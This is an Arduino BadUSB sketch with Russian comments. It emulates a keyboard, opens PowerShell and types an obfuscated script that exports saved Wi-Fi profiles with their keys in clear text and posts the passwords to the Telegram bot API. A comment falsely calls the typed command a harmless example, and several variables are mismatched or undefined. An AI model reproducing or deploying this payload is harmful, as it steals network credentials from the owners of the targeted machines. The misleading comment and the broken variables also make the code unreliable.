#include "Keyboard.h"

// Функция для печати строки с задержками между символами
void typeString(const char *str) {
  for (int i = 0; str[i] != '\0'; i++) {
    // Отправляем текущий символ
    Keyboard.write(str[i]);
    // Небольшая задержка, чтобы система успела обработать ввод
    delay(5); 
  }
}

// Функция для нажатия одной клавиши с последующим отпусканием
void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  // Начинаем эмуляцию клавиатуры
  Keyboard.begin();
  // Ждем, пока устройство будет распознано системой (важно!)
  delay(3000); 

  // 1. Нажать Win + R (# GUI r)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll(); 
  delay(500);

  // 2. Ввести "powershell" и нажать Enter
  // Команда: STRING powershell
  Keyboard.print("powershell");
  typeKey(KEY_RETURN); 
  delay(1500); // Ожидание запуска PowerShell (DELAY 2000)

  // 3. Здесь должен быть скрипт, но мы вводим безопасную команду для примера
  // Вместо вредоносного скрипта введем команду, показывающую путь к temp-папке
  Keyboard.print("$t = \"BOT_TOKEN\"; ");
  Keyboard.print("$c = \"CHAT_ID\"; ");
  Keyboard.print("$a = \"https://api.telegram.org/bot$token/sendMessage\"; ");
  Keyboard.print("IEX \"New-Item -Path `$env:TEMP -Name collector -ItemType Directory -Force\";");
  Keyboard.print("IEX \"Set-Location -Path $nf\";");
  Keyboard.print("IEX \"$d wlan export profile key=clear\";");
  Keyboard.print("$p = @(); ");
  Keyboard.print("$gci = \"G\" + \"et-ChildItem\"; $xc = \"Get\" + \"-Content\";");
  Keyboard.print("IEX \"$gci -Path $nf -Filter '*.xml' | ForEach-Object { ");
  Keyboard.print("    `$x = `$_.FullName; ");
  Keyboard.print("    `$n = `$_.BaseName -replace 'Wireless network-', ''; ");
  Keyboard.print("    [xml]`$xc = $xc `$x; ");
  Keyboard.print("    `$m = `$xc.WLANProfile.MSM.security.sharedKey.keyMaterial; ");
  Keyboard.print("    `$p += `$n + ' : ' + `$m;");
  Keyboard.print("}\";");
  Keyboard.print("$iwr_cmd = [System.Text.Encoding]::ASCII.GetString([byte[]](105, 119, 114));");
  Keyboard.print("$l = \"!!! Collected Wi-Fi passwords: `n`n$($p -join \"`n\")\";");
  Keyboard.print("IEX \"$iwr_cmd -Uri $a -Method Post -Body @{ chat_id = $c; text = `$l } -UseBasicParsing\"; exit");
  typeKey(KEY_RETURN); 
  
  // 4. Нажать Enter для выполнения команды
  delay(1000);
  
  // Завершаем поток клавиатуры (опционально)
  Keyboard.end(); 
}

void loop() {
  // Основной цикл обычно пуст для BadUSB скриптов
}
